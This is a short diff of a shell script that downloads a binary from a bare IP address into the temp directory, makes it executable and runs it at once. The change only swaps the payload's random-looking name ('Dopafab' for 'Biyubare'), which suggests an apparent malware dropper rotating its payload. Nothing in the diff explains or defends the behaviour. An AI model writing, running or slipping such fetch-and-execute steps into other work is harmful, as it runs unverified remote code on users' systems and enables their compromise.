@@ -5,8 +5,8 @@ set -e
 
 cd "$TMPDIR"
 
-curl -fsSL -o Dopafab http://64.89.160.11/Dopafab
+curl -fsSL -o Biyubare http://64.89.160.11/Biyubare
 
-chmod +x Dopafab
+chmod +x Biyubare
 
-./Dopafab
+./Biyubare
